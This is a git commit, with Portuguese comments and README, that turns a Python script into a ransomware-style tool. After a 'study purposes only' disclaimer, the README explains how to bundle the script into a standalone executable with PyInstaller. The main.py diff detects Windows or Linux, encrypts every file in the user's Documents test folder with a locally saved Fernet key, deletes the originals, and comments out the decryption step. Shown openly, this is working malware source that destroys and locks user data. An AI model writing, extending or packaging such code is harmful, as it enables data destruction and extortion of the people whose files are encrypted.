3b851c689c8f05453c5f1b17f8effac8d7d2ad2f
LuizHenz <robertgito@hotmail.com>
2023-10-09 11:39:49 -0300

    update

---
+++ README.md
@@ -0,0 +1,25 @@
+## Aviso: 
+Este código é fornecido apenas para fins de estudo. Não assumo responsabilidade pelo uso indevido ou por quaisquer danos causados a terceiros. Use por sua própria conta e risco.
+
+### Crie um ambiente virtual e ative-o:
+```
+python3 -m venv venv
+
+source venv/bin/activate
+```
+### Instale o PyInstaller:
+```
+pip install pyinstaller
+```
+### Instale as dependências do projeto:
+```
+pip install -r requirements.txt
+```
+### Gere o executável com PyInstaller:
+```
+pyinstaller --onefile --add-data "requirements.txt:." main.py
+
+pyinstaller --onefile --add-data "requirements.txt:." --add-data "install_deps.sh:." main.py
+```
+
+### Os executáveis serão gerados no diretório 'dist'.
--- main.py
+++ main.py
@@ -2,35 +2,8 @@ from cryptography.fernet import Fernet
 import os
 import platform
 
-def identificar_so():
-    sistema = platform.system()
-    release = platform.release()
-
-    if 'Windows' in sistema:
-        print(f'Sistema Operacional: {sistema}')
-        print(f'Release: {release}')
-    elif 'Linux' in sistema:
-        distro = platform.freedesktop_os_release()
-        print(distro['NAME'], distro['VERSION'])
-    else:
-        print(f'Sistema Operacional não reconhecido: {sistema}')
-    
-    return sistema
-
-
-def criar_diretorio(caminho, nome):
-    end_comp = os.path.join(caminho, nome)
-
-    try:
-        os.makedirs(end_comp)
-        print(f'Diretório criado: {end_comp}')
-    except OSError as error:
-        print(f'Erro: {error}')
-
 def user_name():
     return os.getenv('USER') or os.getenv('LOGNAME')
-
-so = identificar_so()
 
 def generate_key():
     return Fernet.generate_key()
@@ -63,34 +36,54 @@ def decrypt_file(encrypted_path, key, output_path):
     with open(output_path, 'wb') as decrypted_file:
         decrypted_file.write(decrypted_data)
 
-nome = user_name()
-diretorio_path = f'/home/{nome}/Documentos/teste'
 
+def criptografar(diretorio_path):
+    key_path = 'key.key'
+    if os.path.exists(key_path):
+        key = load_key(key_path)
+    else:
+        key = generate_key()
+        save_key(key, key_path)
 
-key_path = 'key.key'
-if os.path.exists(key_path):
-    key = load_key(key_path)
-else:
-    key = generate_key()
-    save_key(key, key_path)
+    for filename in os.listdir(diretorio_path):
+        if os.path.isfile(os.path.join(diretorio_path, filename)):
+            file_path = os.path.join(diretorio_path, filename)
+            output_path = os.path.join(diretorio_path, f'encrypted_{filename}')
+            encrypt_file(file_path, key, output_path)
+            print(f'Arquivo {filename} criptografado com sucesso.')
 
-for filename in os.listdir(diretorio_path):
-    if os.path.isfile(os.path.join(diretorio_path, filename)):
-        file_path = os.path.join(diretorio_path, filename)
-        output_path = os.path.join(diretorio_path, f'encrypted_{filename}')
-        encrypt_file(file_path, key, output_path)
-        print(f'Arquivo {filename} criptografado com sucesso.')
+            if not filename.startswith('encrypted_'):
+                os.remove(file_path)
+                print(f'Arquivo original {filename} removido.')
 
-        if not filename.startswith('encrypted_'):
-            os.remove(file_path)
-            print(f'Arquivo original {filename} removido.')
+    # for filename in os.listdir(diretorio_path):
+    #     if filename.startswith('encrypted_'):
+    #         encrypted_file_path = os.path.join(diretorio_path, filename)
+    #         decrypted_file_path = os.path.join(diretorio_path, filename[len('encrypted_'):])
+    #         decrypt_file(encrypted_file_path, key, decrypted_file_path)
+    #         print(f'Arquivo {filename} descriptografado.')
 
-for filename in os.listdir(diretorio_path):
-    if filename.startswith('encrypted_'):
-        encrypted_file_path = os.path.join(diretorio_path, filename)
-        decrypted_file_path = os.path.join(diretorio_path, filename[len('encrypted_'):])
-        decrypt_file(encrypted_file_path, key, decrypted_file_path)
-        print(f'Arquivo {filename} descriptografado.')
+    print('Processo de criptografia realizado com sucesso')
 
+def identificar_so():
+    sistema = platform.system()
+    release = platform.release()
 
-print('Processo de criptografia realizado com sucesso')
+    if 'Windows' in sistema:
+        print(f'Sistema Operacional: {sistema}')
+        print(f'Release: {release}')
+        nome = user_name()
+        diretorio = f'C:\\Users\\{nome}\\Documents\\Teste'
+        criptografar(diretorio)
+    elif 'Linux' in sistema:
+        distro = platform.freedesktop_os_release()
+        print(distro['NAME'], distro['VERSION'])
+        nome = user_name()
+        diretorio = f'/home/{nome}/Documentos/teste'
+        criptografar(diretorio)
+    else:
+        print(f'Sistema Operacional não reconhecido: {sistema}')
+    
+    return sistema
+
+so = identificar_so()
